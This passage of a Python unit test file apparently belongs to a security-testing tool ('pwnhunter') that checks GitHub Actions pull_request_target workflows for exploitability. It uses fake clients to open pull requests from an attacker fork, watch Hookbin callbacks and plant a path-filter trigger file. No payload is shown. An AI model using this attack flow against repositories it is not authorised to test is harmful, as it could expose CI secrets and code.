    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=Path("."),
        sandbox=_FakeSandbox(),  # type: ignore[arg-type]
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        focused_workflow=".github/workflows/ci.yml",
        workflow_timeout=5,
        pr_head_ref="attacker:feature/test",
        pr_base_ref="main",
    )

    assert result["vulnerable"] is False
    assert observed_pr_numbers == [77]


def test_monitor_workflow_opened_only_retry_creates_fresh_pull_request() -> None:
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=_ExecuteHookbinClient(),
    )
    service._retry_with_logs = lambda **kwargs: True  # type: ignore[method-assign]
    service._download_and_extract_logs_with_files = (  # type: ignore[method-assign]
        lambda **kwargs: ("", [])
    )
    service._wait_for_workflow_runs = lambda **kwargs: {  # type: ignore[method-assign]
        "runs_by_id": {
            1: {
                "id": 1,
                "head_sha": "abc123",
                "status": "completed",
                "conclusion": "failure",
                "path": ".github/workflows/ci.yml@main",
            }
        },
        "timed_out": False,
    }
    create_retry_calls: list[int] = []

    result = service._monitor_workflow(  # noqa: SLF001
        client=_OpenedRetryMonitorClient(),  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=2,
        workspace_path=Path("."),
        sandbox=_FakeSandbox(),  # type: ignore[arg-type]
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        focused_workflow=".github/workflows/ci.yml",
        workflow_timeout=5,
        retry_requires_new_pull_request=True,
        create_fresh_pull_request_for_retry=lambda attempt: create_retry_calls.append(
            attempt
        )
        or {"number": 77, "base": {"repo": {"full_name": "playground/repo"}}},
    )

    assert result["vulnerable"] is False
    assert create_retry_calls == [2]


def test_execute_attack_adds_sdk_python_dummy_file_for_path_filtered_workflow(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]

    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github" / "workflows" / "python-tests.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        (
            "name: Python Tests\n"
            "on:\n"
            "  push:\n"
            "    branches: [ \"main\" ]\n"
            "    paths:\n"
            "      - 'sdk/python/**'\n"
            "  pull_request_target:\n"
            "    branches: [ \"main\" ]\n"
            "    paths:\n"
            "      - 'sdk/python/**'\n"
            "  workflow_dispatch:\n"
            "  schedule:\n"
            "    - cron: '0 0 1-31/15 * *'\n"
        ),
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/python-tests.yml",
    )

    trigger_path = workspace / "sdk" / "python" / "pwnhunter-trigger"
    assert result["vulnerable"] is False
    assert result.get("needs_human_review") is not True
    assert trigger_path.exists()
    assert trigger_path.read_text(encoding="utf-8") == (
        "pwnhunter deterministic path-filter trigger\n"
    )
    assert user_b_client.created_pr_payload is not None
